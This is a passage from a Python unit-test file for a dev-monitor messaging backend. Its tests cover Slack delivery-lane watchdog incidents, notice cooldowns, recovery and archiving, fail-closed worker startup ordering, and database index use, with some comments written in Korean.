        card_id, created = MSG.record_lane_watchdog('slack-routine', reason, self.now)
        self.assertEqual((card_id, created), ('old-watchdog', False))
        rows = MSG._conn().execute(
            'SELECT card_id, pinned, occurrence_count, archived_at FROM cards '
            "WHERE source='dev-monitor-watchdog' ORDER BY created_at").fetchall()
        self.assertEqual((rows[0]['card_id'], rows[0]['pinned'],
                          rows[0]['occurrence_count'], rows[0]['archived_at']),
                         ('old-watchdog', 0, 1, None))
        self.assertEqual((rows[1]['card_id'], rows[1]['pinned']), ('new-watchdog', 0))
        self.assertIsNotNone(rows[1]['archived_at'])
        adopted = MSG._conn().execute(
            "SELECT status FROM deliveries WHERE card_id='old-watchdog'"
        ).fetchall()
        self.assertEqual([row['status'] for row in adopted], ['sent'])
        redundant = MSG._conn().execute(
            'SELECT status, last_error, last_error_at FROM deliveries '
            "WHERE card_id='new-watchdog'").fetchall()
        self.assertEqual(len(redundant), 2)
        by_status = {row['status']: row for row in redundant}
        self.assertEqual(set(by_status), {'failed', 'superseded'})
        self.assertEqual(by_status['failed']['last_error'], 'http 404')
        self.assertEqual(by_status['superseded']['last_error'],
                         'superseded watchdog notice')
        self.assertIsNotNone(by_status['superseded']['last_error_at'])
        self.assertFalse(MSG.enqueue_lane_watchdog_notice('old-watchdog', 'slack-urgent'))
        health = MSG.delivery_lane_health('slack-urgent', self.now)
        self.assertEqual(health['delivery_state'], 'sent')
        self.assertEqual(health['terminal_failures_since_success'], 0)
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE kind='lane_watchdog_superseded'"
        ).fetchone()[0], 1)
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE kind='lane_watchdog_notice_adopted'"
        ).fetchone()[0], 1)

    def test_watchdog_rearms_only_after_an_observed_recovery(self):
        reason = {'state': 'failed', 'detail': 'one terminal failure before first success'}
        first, created = MSG.record_lane_watchdog('slack-routine', reason, self.now)
        self.assertTrue(created)
        self.assertTrue(MSG.enqueue_lane_watchdog_notice(first, 'slack-urgent', self.now))
        self.assertEqual(MSG.record_lane_watchdog(
            'slack-routine', reason, self.now + timedelta(minutes=31)), (first, False))
        self.assertEqual(MSG.resolve_lane_watchdog(
            'slack-routine', self.now + timedelta(minutes=32)), 1)
        self.assertEqual(MSG._conn().execute(
            'SELECT status FROM deliveries WHERE card_id=?', (first,)).fetchone()['status'],
            'superseded')
        second, created = MSG.record_lane_watchdog(
            'slack-routine', reason, self.now + timedelta(minutes=33))
        self.assertTrue(created)
        self.assertNotEqual(first, second)
        self.assertTrue(MSG.enqueue_lane_watchdog_notice(
            second, 'slack-urgent', self.now + timedelta(minutes=33)))
        self.assertFalse(MSG.enqueue_lane_watchdog_notice(
            second, 'slack-urgent', self.now + timedelta(minutes=63)))
        self.assertIsNotNone(MSG._conn().execute(
            'SELECT archived_at FROM cards WHERE card_id=?', (first,)).fetchone()['archived_at'])
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog' "
            'AND archived_at IS NULL').fetchone()[0], 1)

    def test_watchdog_notice_cooldown_spans_recovered_cards(self):
        reason = {'state': 'failed', 'detail': 'two of three sends failed'}
        for minute in range(120):
            failed_at = self.now + timedelta(minutes=minute)
            card_id, _ = MSG.record_lane_watchdog('slack-routine', reason, failed_at)
            if card_id is not None:
                MSG.enqueue_lane_watchdog_notice(card_id, 'slack-urgent', failed_at)
            MSG.resolve_lane_watchdog(
                'slack-routine', failed_at + timedelta(seconds=30))
        cards = MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()[0]
        notices = MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.source='dev-monitor-watchdog'"
        ).fetchone()[0]
        self.assertGreater(cards, 0)
        self.assertEqual((cards, notices), (120, 4))

    def test_watchdog_reopens_swept_incident_across_restart_gap(self):
        reason = {'state': 'failed', 'detail': 'continuing failure across restart'}
        first, created = MSG.record_lane_watchdog('slack-routine', reason, self.now)
        self.assertTrue(created)
        self.assertTrue(MSG.enqueue_lane_watchdog_notice(first, 'slack-urgent'))
        MSG.mark_read(first)
        sweep_at = self.now + timedelta(hours=60)
        for index in range(MSG.ARCHIVE_ACTIVE_MIN):
            self._card('restart-filler-%d' % index, MSG.iso(sweep_at))
        with unittest.mock.patch.object(MSG, 'now_utc', return_value=sweep_at):
            MSG.sweep()
        self.assertIsNotNone(MSG._conn().execute(
            'SELECT archived_at FROM cards WHERE card_id=?', (first,)).fetchone()['archived_at'])
        self.assertIn('slack-routine', MSG.active_lane_watchdog_channels())

        reopened = MSG.record_lane_watchdog(
            'slack-routine', reason, sweep_at + timedelta(minutes=1))
        self.assertEqual(reopened, (first, False))
        row = MSG._conn().execute(
            'SELECT archived_at, pinned, occurrence_count FROM cards WHERE card_id=?',
            (first,)).fetchone()
        self.assertEqual((row['archived_at'], row['pinned'], row['occurrence_count']),
                         (None, 0, 1))
        self.assertFalse(MSG.enqueue_lane_watchdog_notice(first, 'slack-urgent'))
        self.assertEqual(MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries WHERE card_id=?', (first,)).fetchone()[0], 1)
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? "
            "AND kind='lane_watchdog_reopened'", (first,)).fetchone()[0], 1)

    def test_watchdog_marks_swept_incident_recovered_before_future_failure(self):
        reason = {'state': 'failed', 'detail': 'old failure'}
        first, _ = MSG.record_lane_watchdog('slack-urgent', reason, self.now)
        MSG.mark_read(first)
        sweep_at = self.now + timedelta(hours=60)
        for index in range(MSG.ARCHIVE_ACTIVE_MIN):
            self._card('recovery-filler-%d' % index, MSG.iso(sweep_at))
        with unittest.mock.patch.object(MSG, 'now_utc', return_value=sweep_at):
            MSG.sweep()
        self.assertIn('slack-urgent', MSG.active_lane_watchdog_channels())
        recovered_at = sweep_at + timedelta(days=10)
        self.assertEqual(MSG.resolve_lane_watchdog('slack-urgent', recovered_at), 1)
        self.assertNotIn('slack-urgent', MSG.active_lane_watchdog_channels())
        self.assertEqual(MSG._conn().execute(
            'SELECT archived_at FROM cards WHERE card_id=?', (first,)
        ).fetchone()['archived_at'], MSG.iso(recovered_at))

        second, created = MSG.record_lane_watchdog(
            'slack-urgent', {'state': 'failed', 'detail': 'future failure'},
            recovered_at + timedelta(minutes=1))
        self.assertTrue(created)
        self.assertNotEqual(first, second)

    def test_watchdog_new_failure_never_rewrites_recovered_card(self):
        first, _ = MSG.record_lane_watchdog(
            'slack-routine', {'state': 'stalled', 'detail': 'old outage'}, self.now)
        original = MSG._conn().execute(
            'SELECT title FROM cards WHERE card_id=?', (first,)).fetchone()['title']
        recovered_at = self.now + timedelta(minutes=3)
        self.assertEqual(MSG.resolve_lane_watchdog('slack-routine', recovered_at), 1)

        second, created = MSG.record_lane_watchdog(
            'slack-routine', {'state': 'failed', 'detail': 'new outage'},
            recovered_at + timedelta(seconds=1))
        self.assertTrue(created)
        self.assertNotEqual(first, second)
        old = MSG._conn().execute(
            'SELECT title, archived_at FROM cards WHERE card_id=?', (first,)).fetchone()
        new = MSG._conn().execute(
            'SELECT title, archived_at FROM cards WHERE card_id=?', (second,)).fetchone()
        self.assertEqual(old['title'], original)
        self.assertEqual(old['archived_at'], MSG.iso(recovered_at))
        self.assertIn('failed', new['title'])
        self.assertIsNone(new['archived_at'])

    def test_watchdog_dismissal_hides_but_does_not_rearm_incident(self):
        reason = {'state': 'failed', 'detail': 'continuing failure after dismiss'}
        first, created = MSG.record_lane_watchdog('slack-urgent', reason, self.now)
        self.assertTrue(created)
        self.assertTrue(MSG.enqueue_lane_watchdog_notice(first, 'slack-routine'))
        self.assertTrue(MSG.dismiss(first))
        self.assertIn('slack-urgent', MSG.active_lane_watchdog_channels())

        same = MSG.record_lane_watchdog(
            'slack-urgent', reason, self.now + timedelta(seconds=5))
        self.assertEqual(same, (first, False))
        row = MSG._conn().execute(
            'SELECT dismissed_at, occurrence_count FROM cards WHERE card_id=?',
            (first,)).fetchone()
        self.assertIsNotNone(row['dismissed_at'])
        self.assertEqual(row['occurrence_count'], 1)
        self.assertFalse(MSG.enqueue_lane_watchdog_notice(first, 'slack-routine'))
        self.assertEqual(MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries WHERE card_id=?', (first,)).fetchone()[0], 1)

        self.assertEqual(MSG.resolve_lane_watchdog(
            'slack-urgent', self.now + timedelta(seconds=10)), 1)
        self.assertNotIn('slack-urgent', MSG.active_lane_watchdog_channels())
        second, created = MSG.record_lane_watchdog(
            'slack-urgent', {'state': 'failed', 'detail': 'future failure'},
            self.now + timedelta(seconds=15))
        self.assertTrue(created)
        self.assertNotEqual(first, second)
        self.assertFalse(MSG.enqueue_lane_watchdog_notice(
            second, 'slack-routine', self.now + timedelta(seconds=15)))
        self.assertTrue(MSG.enqueue_lane_watchdog_notice(
            second, 'slack-routine', self.now + timedelta(minutes=41)))

    def test_watchdog_failed_notice_retries_only_after_shared_cooldown(self):
        reason = {'state': 'failed', 'detail': 'terminal crossover failure'}
        card_id, created = MSG.record_lane_watchdog('slack-routine', reason, self.now)
        self.assertTrue(created)
        self.assertTrue(MSG.enqueue_lane_watchdog_notice(
            card_id, 'slack-urgent', self.now))
        with MSG._conn() as conn:
            conn.execute(
                "UPDATE deliveries SET status='failed', last_error='http 404', "
                'last_error_at=? WHERE card_id=?', (MSG.iso(self.now), card_id))
        self.assertFalse(MSG.enqueue_lane_watchdog_notice(
            card_id, 'slack-urgent', self.now + timedelta(minutes=29)))
        self.assertEqual(MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries WHERE card_id=?', (card_id,)).fetchone()[0], 1)
        self.assertTrue(MSG.enqueue_lane_watchdog_notice(
            card_id, 'slack-urgent', self.now + timedelta(minutes=31)))
        statuses = [row['status'] for row in MSG._conn().execute(
            'SELECT status FROM deliveries WHERE card_id=? ORDER BY id',
            (card_id,)).fetchall()]
        self.assertEqual(statuses, ['failed', 'pending'])
        with MSG._conn() as conn:
            conn.execute(
                "UPDATE deliveries SET status='sent', sent_at=? "
                "WHERE card_id=? AND status='pending'",
                (MSG.iso(self.now + timedelta(minutes=32)), card_id))
        self.assertFalse(MSG.enqueue_lane_watchdog_notice(
            card_id, 'slack-urgent', self.now + timedelta(minutes=62)))
        self.assertEqual(MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries WHERE card_id=?', (card_id,)).fetchone()[0], 2)
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? AND kind IN "
            "('lane_watchdog_notice','lane_watchdog_notice_retry')", (card_id,)
        ).fetchone()[0], 2)

    def test_watchdog_recovery_unpins_legacy_incident(self):
        card_id, _ = MSG.record_lane_watchdog(
            'slack-urgent', {'state': 'failed', 'detail': 'legacy pinned'}, self.now)
        with MSG._conn() as conn:
            conn.execute('UPDATE cards SET pinned=1 WHERE card_id=?', (card_id,))
        self.assertEqual(MSG.resolve_lane_watchdog(
            'slack-urgent', self.now + timedelta(seconds=5)), 1)
        row = MSG._conn().execute(
            'SELECT pinned, archived_at FROM cards WHERE card_id=?', (card_id,)).fetchone()
        self.assertEqual(row['pinned'], 0)
        self.assertIsNotNone(row['archived_at'])
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? AND kind='lane_watchdog_recovered'",
            (card_id,)).fetchone()[0], 1)

    def test_superseded_watchdog_is_not_active(self):
        card_id, _ = MSG.record_lane_watchdog(
            'slack-routine', {'state': 'failed', 'detail': 'duplicate'}, self.now)
        self.assertIn('slack-routine', MSG.active_lane_watchdog_channels())
        with MSG._conn() as conn:
            MSG._audit(conn, 'lane_watchdog_superseded', None, card_id, 'test')
        self.assertNotIn('slack-routine', MSG.active_lane_watchdog_channels())

    def test_watchdog_queries_use_event_indexes_with_scan_positive_control(self):
        conn = MSG._conn()
        group_key = 'dev-monitor:lane-watchdog:slack-routine'
        record_plan = [row['detail'] for row in conn.execute(
            "EXPLAIN QUERY PLAN SELECT card_id FROM cards WHERE group_key=? "
            "AND source='dev-monitor-watchdog' AND NOT EXISTS ("
            'SELECT 1 FROM events WHERE events.card_id=cards.card_id '
            "AND events.kind IN ('lane_watchdog_recovered','lane_watchdog_superseded'))",
            (group_key,)).fetchall()]
        active_plan = [row['detail'] for row in conn.execute(
            "EXPLAIN QUERY PLAN SELECT group_key FROM cards "
            "WHERE source='dev-monitor-watchdog' AND NOT EXISTS ("
            'SELECT 1 FROM events WHERE events.card_id=cards.card_id '
            "AND events.kind IN ('lane_watchdog_recovered','lane_watchdog_superseded'))"
        ).fetchall()]
        notice_plan = [row['detail'] for row in conn.execute(
            'EXPLAIN QUERY PLAN SELECT 1 FROM deliveries d '
            'JOIN cards c ON c.card_id=d.card_id '
            "WHERE c.source='dev-monitor-watchdog' AND c.group_key=? "
            'AND d.channel=? AND d.created_at>? LIMIT 1',
            (group_key, 'slack-urgent', MSG.iso(self.now))).fetchall()]
        production = '\n'.join(record_plan + active_plan + notice_plan)
        self.assertIn('idx_events_card_kind', production)
        self.assertIn('idx_cards_watchdog_group_created', production)
        self.assertIn('idx_deliveries_watchdog_notice', production)
        self.assertNotIn('SCAN events', production)
        known_bad = '\n'.join(row['detail'] for row in conn.execute(
            "EXPLAIN QUERY PLAN SELECT 1 FROM events NOT INDEXED WHERE card_id=? "
            "AND kind IN ('lane_watchdog_recovered','lane_watchdog_superseded')",
            ('known-card',)).fetchall())
        self.assertIn('SCAN events', known_bad)

    def test_lane_watchdog_input_guards_fail_loudly(self):
        for func, args in (
                (MSG.maybe_enqueue_lane_probe, ('slack-unknown', self.now)),
                (MSG.lane_watchdog_reason, ('slack-unknown', 'on', self.now)),
                (MSG.record_lane_watchdog,
                 ('slack-unknown', {'state': 'failed', 'detail': 'test'}, self.now)),
                (MSG.resolve_lane_watchdog, ('slack-unknown', self.now)),
                (MSG.enqueue_lane_watchdog_notice, ('card', 'slack-unknown'))):
            with self.subTest(func=func.__name__):
                with self.assertRaisesRegex(ValueError, 'unknown delivery lane'):
                    func(*args)
        with self.assertRaisesRegex(ValueError, 'unknown watchdog card'):
            MSG.enqueue_lane_watchdog_notice('missing-card', 'slack-urgent')


class TestLaneWorkerStartup(unittest.TestCase):
    def test_watchdog_recovery_threshold_is_24_observations(self):
        self.assertEqual(MSG.LANE_WATCHDOG_RECOVERY_HEALTHY_PASSES, 24)

    def setUp(self):
        fd, self.db = tempfile.mkstemp(suffix='.db')
        os.close(fd)
        os.remove(self.db)
        backend_path = os.path.join(os.path.dirname(__file__), 'airlock-dev-monitor.py')
        spec = importlib.util.spec_from_file_location('airlock_dev_monitor_worker_test', backend_path)
        self.backend = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(self.backend)
        # The backend imports the process-global devmon_messages module.  A focused test
        # selection may jump here from another class whose connection points at its own
        # temporary DB, so isolate this class before _start_messages() calls init_db().
        self.backend.MSG._local = threading.local()
        self.backend.MSG._DB_PATH = None
        self.backend.MESSAGES_REQUESTED = True
        self.backend._MESSAGES_AVAILABLE = True
        self.config = {
            'db': self.db, 'owner': 'owner@example.test', 'spool': tempfile.mkdtemp()
        }
        self.exec_config = {
            'cwd_root': '/tmp', 'session': 'devmon-test', 'runner': '/tmp/runner',
            'plan_dir': '/tmp/plans', 'sentinel_dir': '/tmp/sentinels',
        }

    def tearDown(self):
        self.backend.MSG._local.__dict__.clear()
        self.backend.MSG._DB_PATH = None
        if os.path.exists(self.db):
            os.remove(self.db)

    def _start(self, env, thread=None):
        thread = thread or unittest.mock.Mock()
        with unittest.mock.patch.dict(os.environ, env, clear=True), \
                unittest.mock.patch.object(
                    self.backend.devmon_owner, 'load_config', return_value=self.config), \
                unittest.mock.patch.object(
                    self.backend, '_build_exec_config', return_value=self.exec_config), \
                unittest.mock.patch.object(self.backend.threading, 'Thread', thread):
            self.backend._start_messages()
        return thread

    def test_nothing_that_ingests_starts_before_the_enabled_lanes_are_declared(self):
        """The ordering defect this catches: the spool watcher's first pass happens at once,
        and a restart normally finds files already waiting. Started before the enabled set is
        declared, a card would be routed against the module default and rows would be written
        to a lane whose worker was never started — the 2026-07-30 silence, at boot."""
        INGESTS = ('spool_watcher', 'exec_sentinel', 'exec_reaper')
        seen = []

        def fake_thread(*args, **kwargs):
            handle = unittest.mock.Mock()
            name = kwargs.get('name')
            handle.start.side_effect = lambda: seen.append(
                (name, frozenset(self.backend.MSG.enabled_channels())))
            return handle

        thread = unittest.mock.Mock(side_effect=fake_thread)
        self._start({'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'https://hooks.example/u'},
                    thread=thread)
        started = [name for name, _ in seen]
        for name in INGESTS:
            self.assertIn(name, started, 'expected %s to start — the control for this test' % name)
        final = frozenset(self.backend.MSG.enabled_channels())
        self.assertEqual(final, frozenset({'slack-urgent'}),
                         'only the configured lane may be enabled')
        for name, enabled_then in seen:
            if name in INGESTS:
                self.assertEqual(
                    enabled_then, final,
                    '%s started while the enabled lanes were %s, not %s — it could route a '
                    'card against a guess' % (name, set(enabled_then), set(final)))

    def test_an_unconfigured_box_enables_no_lane_at_all(self):
        # Fail closed: with nothing configured, ingest must write no delivery rows rather
        # than fall back to the module default of the two Slack lanes.
        self._start({})
        self.assertEqual(self.backend.MSG.enabled_channels(), frozenset())

    def test_spool_preflight_fails_closed_before_any_worker_starts(self):
        thread = unittest.mock.Mock()
        stderr = io.StringIO()
        with unittest.mock.patch.object(
                self.backend.devmon_spool, 'ensure_dirs',
                side_effect=RuntimeError('mode drift')), \
                contextlib.redirect_stderr(stderr):
            self._start({}, thread=thread)
        self.assertEqual(self.backend._messages_state(), 'off: spool')
        self.assertIsNone(self.backend.OWNER_CONFIG)
        thread.assert_not_called()
        self.assertIn('messages spool failed', stderr.getvalue())

    def test_box_owner_and_roster_path_are_wired_from_env(self):
        try:
            self._start({'DEV_MONITOR_ROSTER': '/tmp/example-roster.json'})
            self.assertEqual(self.backend.MSG.box_owner(), self.config['owner'])
            self.assertEqual(self.backend.MSG.roster_path(), '/tmp/example-roster.json')
        finally:
            self.backend.MSG.set_roster_path('')
            self.backend.MSG.set_box_owner(None)

    def test_an_unset_roster_env_reads_as_not_configured_rather_than_none(self):
        # Empty is "no roster on this box" (a supported state), never a reason to disable
        # the message feature DEV_MONITOR_OWNER already gated above it.
        try:
            self._start({})
            self.assertEqual(self.backend.MSG.roster_path(), '')
        finally:
            self.backend.MSG.set_roster_path('')
            self.backend.MSG.set_box_owner(None)

    def test_the_lanes_are_closed_before_the_first_worker_starts(self):
        # Pins the fail-closed line itself, which the test above does not: on the success
        # path the final declaration happens to write the same empty set, so deleting the
        # early reset left the whole suite green. Its job is to hold the window open for
        # nothing — any future line added between it and the declaration inherits the closed
        # state rather than the module default.
        first = []

        def fake_thread(*args, **kwargs):
            handle = unittest.mock.Mock()
            handle.start.side_effect = lambda: first.append(
                frozenset(self.backend.MSG.enabled_channels()))
            return handle

        self._start({'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'https://hooks.example/u'},
                    thread=unittest.mock.Mock(side_effect=fake_thread))
        self.assertTrue(first, 'no thread started — the control for this test')
        self.assertEqual(first[0], frozenset(),
                         'a thread started while the module default was still in force')

    def _worker_calls(self, thread):
        return [call for call in thread.call_args_list
                if call.kwargs.get('target') is self.backend.devmon_slack.run_worker]

    def _run_slack_worker_pass(self, lane, outcome, at):
        stop = unittest.mock.Mock()
        stop.is_set.side_effect = [False, True]
        stop.wait.return_value = False
        with unittest.mock.patch.object(self.backend.MSG, 'now_utc', return_value=at), \
                unittest.mock.patch.object(
                    self.backend.devmon_slack, 'send', return_value=outcome) as send:
            self.backend.devmon_slack.run_worker(lane, lane + '-hook', stop)
        return send.call_count

    def test_new_variables_start_two_lane_named_workers(self):
        thread = self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
            'AIRLOCK_DEVMON_SLACK_WEBHOOK': 'legacy-hook',
        })
        workers = self._worker_calls(thread)
        self.assertEqual([call.kwargs['name'] for call in workers],
                         ['slack_urgent_worker', 'slack_routine_worker'])
        self.assertEqual([call.kwargs['args'][:2] for call in workers], [
            ('slack-urgent', 'urgent-hook'), ('slack-routine', 'routine-hook')])
        self.assertEqual(self.backend._messages_state(), 'on')
        health = self.backend._message_lanes_health()
        self.assertEqual(health['slack-urgent']['worker_state'], 'on')
        self.assertEqual(health['slack-routine']['worker_state'], 'on')

    def test_idle_lane_shape_matches_the_ledger_derived_one(self):
        """messages 가 꺼진 경로와 켜진 경로의 lane 키 집합은 같아야 한다.

        2026-08-18 실측 — `_message_lanes_health()` 의 idle fallback 에만
        `last_success_age_seconds` 가 빠져 있었다. 그래서 messages 가 꺼진 설치는 lane 하나가
        10키, 켜진 설치는 11키였다. 소비자는 **켜고 끄는 것만으로 KeyError** 를 만난다
        (`devmon_messages.py` 가 그 키를 실제로 읽는다). 잡은 것은 단위시험이 아니라 주간
        라이브검증의 smoke 였고, 그 검증은 그 시점에 두 주째 못 돌고 있었다.

        한쪽 목록을 손으로 적으면 다음에 필드가 늘 때 또 갈린다 — 그래서 **두 경로를 맞댄다.**
        """
        # 🔴 `_start` 를 부르지 않는다. 부르면 `_MESSAGES_STATE` 가 'on' 이 되어 원장에서 값을
        #    끌어오는 경로를 타고, **정작 검사하려는 idle fallback 은 실행되지 않는다.**
        #    (초판이 그랬다 — 변이시험에서 필드를 지웠는데도 초록이었다.)
        self.backend._MESSAGES_STATE = 'off'
        self.backend.OWNER_CONFIG = None
        for lane in self.backend.MESSAGE_LANES:
            self.backend._MESSAGE_LANE_WORKER_STATES[lane] = 'off: no webhook configured'
        idle = self.backend._message_lanes_health()['slack-urgent']
        self.assertEqual(idle['delivery_state'], 'idle',
                         '이 시험은 idle fallback 경로를 타야 의미가 있습니다')
        # 비교 상대는 실제 원장 경로다. 빈 DB 로 충분하다 — 여기서 보는 것은 값이 아니라 키 집합이다.
        MSG.init_db(self.db)
        ledger = MSG.delivery_lane_health('slack-routine')
        self.assertEqual(set(idle) - {'worker_state'}, set(ledger),
                         'messages off/on 의 lane 키 집합이 다릅니다 — 이게 다르면 소비자가 '
                         '설치 설정만으로 KeyError 를 만납니다')

    def test_legacy_variable_falls_back_to_urgent_only(self):
        workers = self._worker_calls(self._start({
            'AIRLOCK_DEVMON_SLACK_WEBHOOK': 'legacy-hook',
        }))
        self.assertEqual([call.kwargs['args'][:2] for call in workers], [
            ('slack-urgent', 'legacy-hook')])
        health = self.backend._message_lanes_health()
        self.assertEqual(health['slack-urgent']['worker_state'], 'on')
        self.assertEqual(health['slack-routine']['worker_state'],
                         'off: no webhook configured')

    def test_zero_webhooks_keeps_console_on_and_reports_both_dark_lanes(self):
        thread = self._start({})
        workers = self._worker_calls(thread)
        self.assertEqual(workers, [])
        watchdogs = [call for call in thread.call_args_list
                     if call.kwargs.get('target') is self.backend._lane_watchdog_loop]
        self.assertEqual(len(watchdogs), 1)
        self.assertEqual(watchdogs[0].kwargs['name'], 'msg_lane_watchdog')
        self.assertEqual(self.backend._messages_state(), 'on')
        health = self.backend._message_lanes_health()
        for lane in ('slack-urgent', 'slack-routine'):
            self.assertEqual(health[lane]['worker_state'],
                             'off: no webhook configured')
            self.assertEqual(health[lane]['delivery_state'], 'idle')
            self.assertEqual(health[lane]['ledger_error_count'], 0)

        handler = object.__new__(self.backend.Handler)
        handler.path = '/api/health'
        handler._json = unittest.mock.Mock()
        handler.do_GET()
        status, body = handler._json.call_args.args
        self.assertEqual(status, 200)
        self.assertEqual(body['messages'], 'on')
        self.assertEqual(body['message_lanes'], health)

        seeded_at = self.backend.MSG.iso(
            self.backend.MSG.now_utc() - timedelta(minutes=2))
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, '
                'next_attempt_at) VALUES(?,?,?,?,?)',
                ('seeded-health', 'slack-routine', 'pending', seeded_at, seeded_at))
        handler._json.reset_mock()
        handler.do_GET()
        seeded = handler._json.call_args.args[1]['message_lanes']['slack-routine']
        self.assertEqual(seeded['delivery_state'], 'pending')
        self.assertEqual(seeded['pending_count'], 1)
        self.assertGreaterEqual(seeded['oldest_pending_age_seconds'], 119)
        self.assertLessEqual(seeded['oldest_pending_age_seconds'], 121)

    def test_watchdog_both_unconfigured_zero_has_same_path_positive_control(self):
        self._start({})
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(
            at - self.backend.MSG.LANE_OLDEST_OPEN_LIMIT - timedelta(seconds=1))
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, '
                'next_attempt_at) VALUES(?,?,?,?,?)',
                ('preaged-off-branch-control', 'slack-routine', 'pending', old, old))
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr):
            self.backend._lane_watchdog_once({
                'slack-urgent': '', 'slack-routine': '',
            }, at=at)
            self.backend._lane_watchdog_once({
                'slack-urgent': '', 'slack-routine': '',
            }, at=at + timedelta(minutes=31))
        cards = self.backend.MSG._conn().execute(
            "SELECT card_id FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchall()
        self.assertEqual(len(cards), 0)
        self.assertEqual(self.backend.MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries').fetchone()[0], 1)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE kind='lane_watchdog'"
        ).fetchone()[0], 0)
        self.assertNotIn('lane watchdog', stderr.getvalue())
        health = self.backend._message_lanes_health()
        self.assertEqual(health['slack-urgent']['worker_state'],
                         'off: no webhook configured')
        self.assertEqual(health['slack-routine']['worker_state'],
                         'off: no webhook configured')

        # C5 positive control: this same pre-aged row must become non-zero immediately
        # when configured. The off branch is therefore upstream of a live threshold,
        # persistence and notice path rather than a natural 120-second guaranteed zero.
        failed_at = at + timedelta(minutes=32)
        self.backend._lane_watchdog_once({
            'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook',
        }, at=failed_at)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()[0], 1)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE kind='lane_watchdog'"
        ).fetchone()[0], 1)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.source='dev-monitor-watchdog'"
        ).fetchone()[0], 1)

    def test_watchdog_does_not_page_for_intentionally_unconfigured_lane(self):
        self._start({'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook'})
        self.backend._lane_watchdog_once({
            'slack-urgent': '', 'slack-routine': 'routine-hook',
        }, at=self.backend.MSG.now_utc())
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()[0], 0)
        self.assertEqual(self.backend.MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries').fetchone()[0], 0)

    def test_watchdog_stalled_lane_cross_notices_healthy_lane(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        self.backend.MSG._conn().execute(
            'INSERT INTO deliveries(card_id, channel, status, created_at, next_attempt_at) '
            'VALUES(?,?,?,?,?)', ('stalled-real-card', 'slack-urgent', 'pending', old, old))
        self.backend.MSG._conn().commit()
        self.backend._lane_watchdog_once({
            'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook',
        }, at=at)
        notice = self.backend.MSG._conn().execute(
            "SELECT d.channel, c.title FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.source='dev-monitor-watchdog'").fetchone()
        self.assertEqual(notice['channel'], 'slack-routine')
        self.assertIn('urgent lane is stalled', notice['title'])

    def test_sweep_loop_evaluates_both_lane_probes_each_pass(self):
        stop = unittest.mock.Mock()
        stop.is_set.side_effect = [False, True]
        with unittest.mock.patch.object(self.backend.MSG, 'sweep') as sweep, \
                unittest.mock.patch.object(
                    self.backend.MSG, 'maybe_enqueue_lane_probe') as probe:
            self.backend._sweep_loop(stop)
        sweep.assert_called_once_with()
        self.assertEqual(probe.call_args_list, [
            unittest.mock.call('slack-urgent'),
            unittest.mock.call('slack-routine'),
        ])
        stop.wait.assert_called_once_with(900)

    def test_watchdog_retries_notice_after_persist_enqueue_gap(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, next_attempt_at) '
                'VALUES(?,?,?,?,?)', ('stalled-for-gap', 'slack-urgent', 'pending', old, old))
        with unittest.mock.patch.object(
                self.backend.MSG, 'enqueue_lane_watchdog_notice',
                side_effect=RuntimeError('enqueue crashed')):
            self.backend._lane_watchdog_once({
                'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook',
            }, at=at)
        card_id = self.backend.MSG._conn().execute(
